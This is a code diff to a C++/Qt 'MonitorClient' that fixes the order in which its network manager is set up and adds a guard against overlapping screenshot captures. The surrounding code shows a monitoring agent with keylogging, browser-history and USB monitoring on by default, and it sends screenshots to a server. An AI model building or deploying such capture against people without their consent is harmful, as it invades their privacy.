@@ -71,6 +71,9 @@ MonitorClient::MonitorClient()
     isConfigUpdating = false;
     configTimer = new QTimer(this);
     connect(configTimer, &QTimer::timeout, this, &MonitorClient::fetchConfigurationFromAPI);
+
+    // Initialize network manager early so fetchConfigurationFromAPI can use it
+    networkManager = new QNetworkAccessManager(this);
     
     // Debug: Print loaded settings
     qDebug() << "Loaded Server IP:" << getServerIP();
@@ -116,6 +119,7 @@ MonitorClient::MonitorClient()
     keylogEnabled = true;
     browserHistoryEnabled = true;
     usbMonitoringEnabled = true;
+    screenshotInProgress = false;
     
     // Initialize last sent times
     lastKeySentTime = QDateTime();
@@ -125,9 +129,6 @@ MonitorClient::MonitorClient()
     
     // Initialize connection error tracking
     connectionErrorNotified = false;
-    
-    // Initialize network manager
-    networkManager = new QNetworkAccessManager(this);
 }
 
 MonitorClient::~MonitorClient()
@@ -267,6 +268,13 @@ void MonitorClient::handleKeyPress(QString timestamp, const QString &windowTitle
 
 int MonitorClient::getScreen()
 {
+    // Prevent overlapping screenshot captures/sends
+    if (screenshotInProgress) {
+        qDebug() << "Screenshot already in progress, skipping";
+        return 0;
+    }
+
+    screenshotInProgress = true;
     QString filePath = "/tmp/tmp";
     int sendResult = 0;
 
@@ -274,17 +282,18 @@ int MonitorClient::getScreen()
     qDebug() << "Grabbing screen";
     grabScreen(filePath, res);
 
-    if (res) 
-    {
+    if (res) {
         sendResult = sendScreens(filePath + ".jpg");
         if (sendResult < 0) {
+            screenshotInProgress = false;
             return 0;
         }
-        
+
         // Clean up the temporary file
         QFile::remove(filePath + ".jpg");
     }
-    
+
+    screenshotInProgress = false;
     return sendResult;
 }
 
